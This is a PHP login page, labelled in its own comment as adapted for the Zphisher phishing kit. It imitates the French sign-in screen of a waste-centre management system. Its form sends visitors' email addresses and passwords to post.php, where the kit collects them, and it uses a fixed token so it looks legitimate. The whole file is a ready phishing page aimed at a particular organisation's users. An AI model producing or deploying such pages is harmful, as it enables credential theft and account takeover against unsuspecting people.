<?php
// Adapted login.php for Zphisher
session_start();

$error = $_SESSION['error'] ?? null;
unset($_SESSION['error']);
?>
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion - Système Déchèteries</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0a0a1e 0%, #1a1a3e 50%, #2a2a5e 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #ffffff;
        }

        .login-container {
            background: linear-gradient(135deg, rgba(255, 255, 255, 0.05) 0%, rgba(255, 255, 255, 0.02) 100%);
            backdrop-filter: blur(20px);
            border-radius: 25px;
            padding: 50px;
            width: 90%;
            max-width: 450px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 20px 60px rgba(0, 255, 204, 0.3);
        }

        .login-header {
            text-align: center;
            margin-bottom: 40px;
        }

        .login-header h1 {
            font-size: 2.5em;
            margin-bottom: 10px;
            background: linear-gradient(135deg, #00ffcc, #667eea);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            font-weight: 900;
        }

        .login-header p {
            color: rgba(255, 255, 255, 0.7);
        }

        .form-group {
            margin-bottom: 25px;
        }

        .form-group label {
            display: block;
            margin-bottom: 10px;
            font-weight: 700;
            color: #00ffcc;
            text-transform: uppercase;
            letter-spacing: 1px;
            font-size: 0.85em;
        }

        .form-group input {
            width: 100%;
            padding: 15px 20px;
            border-radius: 12px;
            border: 2px solid rgba(0, 255, 204, 0.3);
            background: rgba(255, 255, 255, 0.05);
            color: white;
            font-size: 16px;
            transition: all 0.3s ease;
        }

        .form-group input:focus {
            outline: none;
            border-color: #00ffcc;
            background: rgba(255, 255, 255, 0.1);
            box-shadow: 0 0 20px rgba(0, 255, 204, 0.3);
        }

        .form-group input::placeholder {
            color: rgba(255, 255, 255, 0.4);
        }

        .btn-submit {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #00ffcc 0%, #667eea 100%);
            border: none;
            border-radius: 15px;
            color: #000;
            font-size: 18px;
            font-weight: 800;
            cursor: pointer;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 2px;
            box-shadow: 0 10px 30px rgba(0, 255, 204, 0.4);
            margin-top: 10px;
        }

        .btn-submit:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 40px rgba(0, 255, 204, 0.6);
        }

        .alert {
            padding: 15px 20px;
            border-radius: 12px;
            margin-bottom: 25px;
            border-left: 5px solid;
            backdrop-filter: blur(10px);
            font-weight: 600;
        }

        .alert-error {
            background: rgba(220, 53, 69, 0.2);
            border-color: #dc3545;
            color: #ff6b6b;
        }

        .alert-success {
            background: rgba(40, 167, 69, 0.2);
            border-color: #28a745;
            color: #51cf66;
        }

        .back-link {
            text-align: center;
            margin-top: 20px;
        }

        .back-link a {
            color: #00ffcc;
            text-decoration: none;
            font-weight: 600;
        }

        .back-link a:hover {
            text-decoration: underline;
        }

        /* Responsive Design */
        @media (max-width: 768px) {
            .login-container {
                padding: 30px 20px;
                width: 95%;
            }

            .login-header h1 {
                font-size: 2em;
            }

            .form-group input {
                padding: 12px 15px;
                font-size: 14px;
            }

            .btn-submit {
                padding: 15px;
                font-size: 16px;
            }
        }

        @media (max-width: 480px) {
            .login-container {
                padding: 25px 15px;
            }

            .login-header h1 {
                font-size: 1.6em;
            }

            .login-header p {
                font-size: 0.9em;
            }
        }
    </style>
</head>
<body>

<div class="login-container">
    <div class="login-header">
        <h1>🔐 Connexion</h1>
        <p>Système de gestion des déchèteries</p>
    </div>

    <?php if ($error): ?>
      <div class="alert alert-error"><?php echo htmlspecialchars($error); ?></div>
    <?php endif; ?>
    
    <form action="post.php" method="POST">
        <input type="hidden" name="csrf_token" value="2db1bbc1e5614ad116d26de2e4caec43661b9e4123dca7850fb35e179c7156fa">
        <div class="form-group">
            <label>Email</label>
            <input type="email" name="email" required placeholder="votre@email.fr" autofocus>
        </div>

        <div class="form-group">
            <label>Mot de passe</label>
            <input type="password" name="password" required placeholder="••••••••">
        </div>

        <button type="submit" class="btn-submit">Se connecter</button>
    </form>


    <div class="back-link">
        <a href="#">Pas de compte ? S'inscrire</a> | 
        <a href="#">← Retour à l'accueil</a>
    </div>
</div>

</body>
</html>
